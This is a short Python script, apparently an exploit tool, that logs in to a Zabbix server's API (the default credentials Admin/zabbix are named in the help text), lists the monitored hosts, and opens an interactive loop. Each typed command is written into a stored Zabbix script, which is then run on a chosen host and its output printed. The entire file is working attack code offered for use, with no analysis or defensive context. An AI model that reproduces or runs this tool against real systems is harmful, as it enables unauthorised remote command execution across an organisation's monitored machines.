import requests
import json
import argparse

header = {"Content-Type": "application/json"}
headers = {
    'content-type': 'application/json',
}
def get_auth_id(url,username, password):
    payload = {
        "jsonrpc" : "2.0",
        "method" : "user.login",
        "params": {
            'user': ""+username+"",
            'password': ""+password+"",
        },
        "auth" : None,
        "id" : 0,
    }
    auth = requests.post(url, data=json.dumps(payload),headers=(headers),verify=False)
    auth = auth.json()
    return auth

def get_host_id(url,auth):
    print(auth)
    data = {
        "jsonrpc":"2.0",
        "method":"host.get",
        "params":{
            "output":["hostid","name"],
            "filter":{"host":""}
        },
        "auth":""+auth['result']+"",
        "id":1,
    }
    hostid = requests.post(url, data=json.dumps(data), headers=(headers), verify=False)
    hostid = hostid.json()
    for hid in hostid['result']:
        print ("    {hostid}:{name}".format(hostid=str(hid['hostid']),name=str(hid['name'])))

def rce(url,auth):
    hostid = input("[input_host_id] >>: ")
    while True:
        cmd = input('[zabbix_cmd]>>: ')
        if cmd == "" : print ("Result of last command:")
        if cmd == "quit" : break
        payload = {
            "jsonrpc": "2.0",
            "method": "script.update",
            "params": {
                "scriptid": "1",
                "command": ""+cmd+""
            },
            "auth" : auth['result'],
            "id" : 0,
        }
        cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers), verify=False)
        payload = {
            "jsonrpc": "2.0",
            "method": "script.execute",
            "params": {
                "scriptid": "1",
                "hostid": ""+hostid+""
            },
            "auth" : auth['result'],
            "id" : 0,
        }
        cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers), verify=False)
        cmd_exe = cmd_exe.json()
        print (cmd_exe["result"]["value"])
        if cmd == 'quit':
            break

def exploit(url, username, password):
    print("[+] Obtaining auth token... ")
    auth = get_auth_id(url, username,password)
    print("[+] Obtaining hostid...")
    get_host_id(url, auth)
    print("[+] Executing remote code execution exploit...")
    rce(url,auth)
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', help="Zabbix URL")
    parser.add_argument('--username', help="Admin username of Zabbix user (Default: Admin)")
    parser.add_argument('--password', help = "Password for Zabbix user (Default: zabbix)")
    args = parser.parse_args()
    url = str(args.url) + "/api_jsonrpc.php" 
    exploit(url, args.username,args.password)
